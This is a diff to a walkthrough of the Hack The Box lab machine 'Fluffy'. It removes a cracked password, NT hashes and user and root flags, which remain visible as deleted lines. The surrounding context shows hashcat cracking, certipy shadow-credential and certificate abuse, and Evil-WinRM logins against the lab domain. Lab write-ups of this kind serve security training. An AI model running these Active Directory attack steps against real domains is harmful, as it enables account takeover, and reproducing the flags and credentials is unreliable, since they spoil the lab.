@@ -288,12 +288,6 @@ With the captured hash saved into a file (hash.txt), I used Hashcat with the Net
 └─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
 ```
 
-{{% fixit-encryptor "prometheusx-303" "Cracked password" %}}
-
-  `prometheusx-303`
-
-{{% /fixit-encryptor %}}
-
 ## Post-Exploitation
 
 With valid credentials in hand, I attempted to establish a WinRM session using Evil-WinRM, a common tool for executing commands remotely on Windows hosts
@@ -407,8 +401,6 @@ But instead, I chose to exploit the Shadow Credentials technique on ca_svc, usin
 └─$ certipy-ad shadow auto -u "p.agila@dc01.fluffy.htb" -p '<password>' -account 'CA_SVC'
 ```
 
-{{% fixit-encryptor "33bd09dcd697600edf6b3a7af4875767" "Hash SVC" %}}
-
   ```bash
   Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
@@ -433,10 +425,7 @@ File 'winrm_svc.ccache' already exists. Overwrite? (y/n - saying no will save wi
 [*] Trying to retrieve NT hash for 'winrm_svc'
 [*] Restoring the old Key Credentials for 'winrm_svc'
 [*] Successfully restored the old Key Credentials for 'winrm_svc'
-[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
   ```
-
-{{% /fixit-encryptor %}}
 
 > [!TIP]
 > Always try to crack TGS hashes first. If it fails or takes too long, fallback on abusing Shadow Credentials or certificate enrollment if the target environment allows it.
@@ -458,14 +447,9 @@ Info: Establishing connection to remote endpoint
 
 ```
 
-{{% fixit-encryptor "3ed459e91984515db1feeae2b764dc79" "Flag User" %}}
-
   ```bash
   *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
-  3ed459e91984515db1feeae2b764dc79
   ```
-
-{{% /fixit-encryptor %}}
 
 ## Privilege Escalation
 
@@ -589,8 +573,6 @@ I then authenticated as administrator@fluffy.htb using the certificate I had jus
 └─$ certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip '10.129.202.3'
 ```
 
-{{% fixit-encryptor "8da83a3fa618b6e3a00e93f676c92a6e" "Hash Root" %}}
-
   ```bash
   Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
@@ -603,10 +585,7 @@ I then authenticated as administrator@fluffy.htb using the certificate I had jus
 File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
   ```
-
-{{% /fixit-encryptor %}}
 
 Finally, I used Evil-WinRM to connect to the target as administrator, using the NT hash I recovered earlier
 Once connected, I navigated to the Administrator's Desktop and retrieved the final root flag
@@ -625,14 +604,9 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
-{{% fixit-encryptor "86462761aea06e38247193401ba674bf" "Flag Root" %}}
-
    ```bash
   *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-  86462761aea06e38247193401ba674bf
   ```
-
-{{% /fixit-encryptor %}}
 
 ## Conclusion
 
